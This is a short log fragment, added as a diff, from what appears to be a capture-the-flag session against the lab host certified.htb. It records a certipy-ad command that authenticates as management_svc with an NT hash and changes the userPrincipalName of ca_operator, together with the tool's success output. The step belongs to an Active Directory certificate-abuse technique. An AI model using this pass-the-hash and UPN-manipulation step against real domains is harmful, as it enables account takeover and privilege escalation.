@@ -1,0 +1,12 @@
+### [2026-04-06 17:10:02] certipy-ad account update -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb
+
+$ certipy-ad account update -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb
+
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Updating user 'ca_operator':
+    userPrincipalName                   : ca_operator@certified.htb
+[*] Successfully updated 'ca_operator'
+
+# Exit code: 0
+# Duration: 2026-04-06 17:10:03
